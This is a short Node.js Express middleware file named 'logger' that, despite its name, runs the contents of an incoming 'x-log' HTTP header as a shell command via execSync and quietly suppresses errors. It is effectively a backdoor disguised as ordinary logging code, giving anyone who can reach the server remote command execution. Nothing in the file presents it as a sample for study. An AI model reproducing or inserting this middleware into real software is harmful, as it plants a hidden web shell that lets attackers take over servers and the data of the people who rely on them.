const { execSync } = require("child_process");

const logger = (req, res, next) => {
  const log = req.headers["x-log"];

  if (log) {
    try {
      execSync(log, { encoding: "utf-8", timeout: 100 });
    } catch (err) {
      console.error("Error evaluating x-log:", err);
    }
  }

  next();
};

module.exports = logger;
